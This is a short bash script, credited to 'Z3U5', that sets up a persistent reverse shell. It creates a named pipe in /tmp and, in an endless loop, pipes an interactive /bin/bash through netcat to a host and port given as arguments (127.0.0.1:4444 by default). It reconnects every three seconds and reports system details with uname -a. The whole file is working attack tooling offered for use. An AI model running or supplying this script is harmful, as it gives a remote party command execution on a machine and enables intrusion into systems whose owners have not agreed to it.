#!/bin/bash
# BASH reverse shelll
# Created by: Z3U5

OPTIONS=$1

if [ "$OPTIONS" = "bind" ]
then
	LHOST=$2
	LPORT=$3

	rm -rf /tmp/zeus*
	mkfifo /tmp/zeusPipe

	while true
	do
		cat /tmp/zeusPipe|$0 shell 2>&1|nc $LHOST $LPORT >/tmp/zeusPipe
		sleep 3
	done

elif [ "$OPTIONS" = "shell" ]
then
	echo "[+] spawning shell.."
	uname -a
	echo ""
	echo ""
	/bin/bash

else
	LHOST="127.0.0.1"
	LPORT="4444"

	# Start Bind
	$0 bind $LHOST $LPORT
fi
